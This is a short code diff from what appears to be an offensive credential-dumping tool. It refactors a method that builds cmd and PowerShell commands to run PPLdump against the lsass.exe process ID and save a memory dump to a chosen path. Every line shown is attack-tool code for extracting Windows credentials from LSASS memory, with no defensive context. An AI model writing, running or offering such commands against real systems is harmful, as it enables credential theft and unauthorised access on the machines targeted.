@@ -22,12 +22,12 @@ class DumpMethod(IDumpMethod):
         self.clean_dependencies([self.ppldump])
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
-        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} %J {}{}""".format(
-            self.ppldump.remote_path, self.ppldump.file,
+        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J {}{}""".format(
+            self.ppldump.get_remote_path(),
             self.dump_path, self.dump_name
         )
-        pwsh_command = """{}{} (Get-Process lsass).Id {}{}""".format(
-            self.ppldump.remote_path, self.ppldump.file,
+        pwsh_command = """{} (Get-Process lsass).Id {}{}""".format(
+            self.ppldump.get_remote_path(),
             self.dump_path, self.dump_name
         )
         return {
